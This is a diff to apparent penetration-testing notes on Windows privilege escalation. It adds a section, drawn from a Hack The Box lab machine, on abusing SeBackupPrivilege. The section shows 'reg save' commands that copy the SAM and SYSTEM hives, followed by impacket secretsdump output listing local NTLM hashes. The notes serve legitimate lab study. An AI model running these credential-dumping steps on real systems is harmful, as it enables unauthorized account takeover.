@@ -16,7 +16,7 @@ Windows 10 Exploits:
 
 ### Low Hanging Fruit&#x20;
 
-[Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes\_Windows\_Privesc.html)
+[Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
 
 ```
 whoami /priv 
@@ -34,6 +34,48 @@ If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
 * <pre><code><strong>https://github.com/gtworek/Priv2Admin
   </strong>https://ppn.snovvcrash.rocks/pentest/infrastructure/post-exploitation
   </code></pre>
+
+### SeBackupPrivilege
+
+* from sliver session can see privs&#x20;
+* [https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md](https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md)
+
+```
+getprivs
+
+Privilege Information for cicada.htb.exe (PID: 3848)
+----------------------------------------------------
+
+Process Integrity Level: High
+
+Name                          	Description                    	Attributes
+====                          	===========                    	==========
+SeBackupPrivilege             	Back up files and directories  	Enabled, Enabled by Default
+SeRestorePrivilege            	Restore files and directories  	Enabled, Enabled by Default
+SeShutdownPrivilege           	Shut down the system           	Enabled, Enabled by Default
+SeChangeNotifyPrivilege       	Bypass traverse checking       	Enabled, Enabled by Default
+SeIncreaseWorkingSetPrivilege 	Increase a process working set 	Enabled, Enabled by Default
+```
+
+* backup the registry hives&#x20;
+
+```
+cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
+cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
+```
+
+* download files and then use `impacket secretsdump.py`
+
+```
+python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
 
 ### Search for files with passwords in them&#x20;
 
